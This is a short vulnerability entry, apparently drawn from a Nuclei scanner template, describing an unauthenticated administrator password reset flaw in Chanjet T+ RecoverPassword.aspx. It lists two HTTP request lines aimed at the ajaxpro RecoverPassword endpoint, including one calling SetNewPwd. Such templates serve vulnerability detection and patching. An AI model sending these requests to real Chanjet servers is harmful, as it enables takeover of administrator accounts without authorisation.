# Vulnerability: Chanjet Tplus - Unauthorized Password Reset
**Classification:** TPLUS
**Source:** Nuclei Template (`chanjet-tplus-unauth-passreset.yaml`)

## Description
There is an unauthorized administrator password modification vulnerability in UF Chanjet T+ RecoverPassword.aspx. An attacker can use this vulnerability to modify the administrator account password to log in to the backend.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method={{randbase(6)}}
GET {{BaseURL}}/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd
```

